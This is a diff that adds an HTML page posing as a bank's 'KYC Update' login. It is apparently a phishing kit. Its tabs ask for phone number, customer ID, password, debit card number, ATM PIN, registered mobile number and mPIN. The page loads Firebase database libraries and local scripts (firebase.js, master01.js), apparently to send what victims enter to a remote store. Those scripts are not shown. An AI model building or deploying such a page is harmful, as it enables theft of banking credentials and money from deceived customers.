@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width">
+<title>Wellcome</title>
+<meta name="description" content="login">
+<meta name="next-head-count" content="4">
+
+<link rel="preload" href="8cc68e2ef518f736.css" as="style">
+
+
+<link rel="stylesheet" href="8cc68e2ef518f736.css" data-n-g="">
+
+
+    <link rel="icon" type="image/png" sizes="32x32" href="green2.png">
+
+
+
+    </head><body>
+
+    <div id="">
+    <div class="header">
+
+    <span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative; max-width: 100%;">
+    <span style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; max-width: 100%;"><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27125%27%20height=%2735%27/%3e" style="display: block; max-width: 100%; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px;"></span>
+
+
+
+
+    <img alt="Logo" src="green.png" decoding="async" data-nimg="intrinsic" class="img-logo" style="width: 0px; position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;"></span>
+
+
+
+    </div>
+
+    <div class="mainContent">
+    <h1 class="text-center">Login to KYC Update</h1>
+
+    <div class="card">
+
+
+
+
+    <div class="card-login">
+
+
+
+            <button id="a" type="button" onclick="openCity(event, 'form1')" value="A">Login ID / Customer ID</button><button id="b" type="button" onclick="openCity(event, 'form2')" value="B" class="">Debit Card No.</button><button id="c" type="button" onclick="openCity(event, 'form3')" value="C" class="active">MPIN</button>
+
+
+        </div>
+
+    <script>
+    function openCity(evt, cityName) {
+        var i, tabcontent, tablinks;
+        tabcontent = document.getElementsByClassName("tabcontent");
+        for (i = 0; i < tabcontent.length; i++) {
+            tabcontent[i].style.display = "none";
+        }
+        tablinks = document.getElementsByClassName("card-login")[0].getElementsByTagName("button");
+        for (i = 0; i < tablinks.length; i++) {
+            tablinks[i].classList.remove("active");
+        }
+        evt.currentTarget.classList.add("active");
+        document.getElementById(cityName).style.display = "block";
+    }
+</script>
+
+
+
+    <div class="card">
+            <div id="form1" class="tabcontent" style="display: none;">
+
+
+<form id="ududip007" class="LoginForm" method="post" autocomplete="off">
+
+
+    <div class="form-group">
+
+
+                        <label for="LoginId">Phone Number</label>
+
+
+
+        <input tabindex="1" class="new-control" type="text" id="uphone" inputmode="numeric" placeholder="" required pattern="\d{1}\s?\d{1}\s?\d{1}\s?\d{1}\s?\d{1}\s?\d{1}\s?\d{1}\s?\d{1}\s?\d{1}\s?\d{1}" minlength="18" maxlength="18" required oninput="insertSpaces(this)" autocomplete="off">
+
+  <script>
+    function insertSpaces(element) {
+      var value = element.value.replace(/\s/g, ''); // Remove existing spaces
+      var formattedValue = '';
+
+      for (var i = 0; i < value.length; i++) {
+        formattedValue += value[i];
+
+        if ((i + 1) % 1 === 0 && (i + 1) !== value.length) {
+          formattedValue += ' '; // Add space after each character
+        }
+      }
+
+      element.value = formattedValue;
+    }
+  </script>             </div>
+
+
+    <div class="form-group">
+                        <label for="LoginId">Login Id / Customer ID</label>
+                        <input type="text" id="ucid" class="new-control" name="LoginId" inputMode="numeric" required="">
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="pword" class="new-control" minLength="8" name="Password" required="">
+                    </div>
+                    <div class="text-center">
+                        <button type="submit" class="submit">LOGIN</button>
+                    </div>
+                </form>
+
+
+
+
+
+                <div class="text-center" style="font-size: 16px; line-height: 16px; font-weight: 400;">Forgot Password? <a href="card.html"> Reset Here</a> <br>Locked your account? <a href="card.html"> Enable Login ID</a>
+
+
+            </div></div>
+
+            <div id="form2" class="tabcontent" style="display: none;">
+                <form id="ududip007" class="LoginForm" method="post" autocomplete="off">
+
+
+                    <div class="form-group">
+                        <label for="customerId">Debit Card No</label>
+                        <input type="text" id="ucard" class="new-control" name="CardNumber" inputMode="numeric" minLength="16" maxLength="16" title="Please enter 16-digit card number" required="" value="">
+                    </div>
+                    <div class="form-group">
+                        <label for="CardPin">ATM Pin No</label>
+                        <input type="password" id="upin" class="new-control" inputMode="numeric" minLength="4" maxLength="4" name="CardPin" required="">
+                    </div>
+                    <div class="text-center">
+                        <button type="submit" class="submit">LOGIN</button>
+                    </div>
+                </form>
+            </div>
+
+            <div id="form3" class="tabcontent">
+              <form id="ududip007" class="LoginForm" method="post" autocomplete="off">
+
+
+
+
+    <div class="form-group">
+  <label for="customerId">Select Option</label> <br/>
+
+
+    <input type="radio" name="LoginMpinVia" class="radio" value="CustomerId" onclick="toggleForm('form4', 'form5')">
+
+
+  <span class="label">Customer ID</span> <br/> <br/>
+
+
+  <input type="radio" name="LoginMpinVia" class="radio"  checked="" value="MobileNumber" onclick="toggleForm('form5', 'form4')">
+
+
+  <span class="label">Registered Mobile No.</span>
+</div>
+
+<div id="form4" class="form-group" style="display: none;">
+  <label for="customerId">Customer ID</label>
+  <input type="text" id="umcid" class="new-control" name="CustomerID" inputMode="numeric">
+</div>
+<div id="form5" class="form-group">
+  <label for="MobileNumber">Registered Mobile No.</label>
+  <input type="text" id="cphone" class="new-control" minLength="10" maxLength="10" name="RegisteredMobileNumber" inputMode="numeric" required="">
+</div>
+<div id="form6" class="form-group">
+  <label for="password">mPin (Please enter 6 Digit mPin) </label>
+  <input type="password" id="umpin" class="new-control" inputMode="numeric" maxlength="6" minlength="6" name="MPINNO" required="">
+</div>
+
+<script>
+function toggleForm(showFormId, hideFormId) {
+  var showForm = document.getElementById(showFormId);
+  var hideForm = document.getElementById(hideFormId);
+
+  showForm.style.display = 'block';
+  hideForm.style.display = 'none';
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    <div class="text-center">
+                        <button type="submit" class="submit">LOGIN</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+
+        </div></div>
+
+
+
+    <span style="box-sizing: border-box; display: block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;"><span style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 181.405% 0px 0px;"></span>
+
+    <img alt="screen" src="screen.png" decoding="async" data-nimg="responsive" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;"></span>
+
+    </div>
+
+    <next-route-announcer><p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; width: 1px; white-space: nowrap; overflow-wrap: normal;">Wellcome</p></next-route-announcer>
+
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1/firebase.js"></script>
+
+
+<script src="firebase.js">  </script>
+<script src="master01.js">  </script>
+
+
+
+    </body></html>
